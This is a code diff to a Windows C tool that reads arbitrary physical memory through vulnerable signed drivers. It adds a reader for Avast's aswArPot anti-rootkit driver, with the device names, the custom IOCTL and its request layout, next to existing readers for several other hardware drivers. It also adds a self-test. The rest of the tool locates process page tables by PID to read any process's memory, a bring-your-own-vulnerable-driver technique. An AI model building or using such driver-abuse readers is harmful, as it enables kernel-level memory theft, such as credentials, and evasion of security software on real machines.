@@ -309,6 +309,40 @@ static int read_asio2(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size) 
     return 1;
 }
 
+// ---- 取数层 provider: Avast aswArPot (anti-rootkit) physical read ----
+// Device \Device\<prefix>SP_ArPot2; IOCTL 0x9988C408 (custom):
+//   input 12 bytes {u32 phys; u32 reserved; u32 size}; output = size bytes.
+// Driver (FUN_140023540) MmMapIoSpace's the 32-bit PA and copies size bytes
+// to the output buffer. 32-bit PA limit. Dynamic test pending (signed driver).
+static int aswarpot_build_read_request(uint32_t pa, uint32_t size, uint8_t out[12]) {
+    if (!out || !size) return 0;
+    memset(out, 0, 12);
+    *(uint32_t *)(out + 0) = pa;
+    *(uint32_t *)(out + 4) = 0;
+    *(uint32_t *)(out + 8) = size;
+    return 1;
+}
+
+static int read_aswarpot(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size) {
+    if (r->dev == INVALID_HANDLE_VALUE || !buf || !size) return 0;
+    uint8_t *out = (uint8_t *)buf;
+    uint32_t done = 0;
+    while (done < size) {
+        uint64_t cur = pa + done;
+        if (cur > 0xFFFFFFFFull) return 0;  // driver takes a 32-bit PA
+        uint32_t chunk = size - done;
+        if (chunk > 0x1000) chunk = 0x1000;
+        uint8_t in[12];
+        DWORD ret = 0;
+        if (!aswarpot_build_read_request((uint32_t)cur, chunk, in)) return 0;
+        if (!DeviceIoControl(r->dev, 0x9988C408u, in, sizeof(in), out + done, chunk, &ret, NULL))
+            return 0;
+        if (ret != chunk) return 0;
+        done += chunk;
+    }
+    return 1;
+}
+
 static int reader_open(mb_phys_reader *r, const char *kind, const char *device) {
     memset(r, 0, sizeof(*r));
     r->dev = INVALID_HANDLE_VALUE;
@@ -382,8 +416,23 @@ static int reader_open(mb_phys_reader *r, const char *kind, const char *device) 
                              NULL, OPEN_EXISTING, 0, NULL);
         if (r->dev == INVALID_HANDLE_VALUE)
             fprintf(stderr, "[HINT] AsIO2 gate: run bin\\layers_asio2.exe (ASUSCERT resource + timestamp 0)\n");
+    } else if (_stricmp(kind, "aswarpot") == 0) {
+        r->name = "aswarpot";
+        r->mode = 9;
+        r->read = read_aswarpot;
+        const char *candidates[] = { "\\\\.\\aswSP_ArPot2", "\\\\.\\avastSP_ArPot2", "\\\\.\\aswSP_ArPot" };
+        if (device) {
+            r->dev = CreateFileA(device, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
+                                 NULL, OPEN_EXISTING, 0, NULL);
+        } else {
+            for (int ci = 0; ci < 3 && r->dev == INVALID_HANDLE_VALUE; ci++)
+                r->dev = CreateFileA(candidates[ci], GENERIC_READ | GENERIC_WRITE,
+                                     FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+        }
+        if (r->dev == INVALID_HANDLE_VALUE)
+            fprintf(stderr, "[HINT] aswArPot device not found (try --device \\\\.\\aswSP_ArPot2)\n");
     } else {
-        fprintf(stderr, "[ERR] unknown reader '%s' (mock|cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2)\n", kind ? kind : "");
+        fprintf(stderr, "[ERR] unknown reader '%s' (mock|cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2|aswarpot)\n", kind ? kind : "");
         return 0;
     }
     if (r->dev == INVALID_HANDLE_VALUE) {
@@ -996,6 +1045,13 @@ static int selftest_mock(void) {
                  acmd.args.q[2] == (UINT64)(uintptr_t)dummy;
     check("取数层(fetcher)", "asrdrv read command layout (opcode/args)", ok_asr);
 
+    // Avast aswArPot physical read request layout (offline, no driver)
+    uint8_t aswrq[12];
+    int ok_aswr = aswarpot_build_read_request(0x12345678, 0x1000, aswrq) &&
+                  *(uint32_t *)(aswrq + 0) == 0x12345678 &&
+                  *(uint32_t *)(aswrq + 8) == 0x1000;
+    check("取数层(fetcher)", "aswArPot physical read request layout", ok_aswr);
+
     // 定位层 alone (physical EPROCESS scan, no kernel reader)
     uint64_t located_cr3 = 0, eproc = 0;
     int ok_loc = mb_layer_locate_cr3_scan(&r, 0x8000, 0x1000, 4242, "MOCK.exe",
@@ -1109,10 +1165,10 @@ static void usage(void) {
     printf("Usage:\n");
     printf("  layers --selftest-mock\n");
     printf("  layers --ranges                       (read physical RAM ranges from registry)\n");
-    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2> [--device <path>] --read-phys --pa <hex> --size <n>\n");
-    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2> [--device <path>] --cr3 <hex> --va <hex> --size <n>\n");
-    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2> [--device <path>] --locate --pid <pid> --scan-start <hex> --scan-size <hex> [--name <exe>]\n");
-    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2> [--device <path>] --locate --pid <pid> --auto-ranges [--name <exe>]\n");
+    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2|aswarpot> [--device <path>] --read-phys --pa <hex> --size <n>\n");
+    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2|aswarpot> [--device <path>] --cr3 <hex> --va <hex> --size <n>\n");
+    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2|aswarpot> [--device <path>] --locate --pid <pid> --scan-start <hex> --scan-size <hex> [--name <exe>]\n");
+    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz|asupio64|asio2|aswarpot> [--device <path>] --locate --pid <pid> --auto-ranges [--name <exe>]\n");
     printf("  layers --reader ... --locate --pid <pid> (--scan-start/--scan-size | --auto-ranges) --va <hex> --size <n>\n");
     printf("  layers --locate --kkyum --pid <pid> [--kkyum-device <path>]   (kernel-VA locator; no physical reader needed)\n");
     printf("  layers --locate --kprl --pid <pid> [--kprl-device <path>]     (KPRL CR3-by-PID; no physical reader needed)\n");
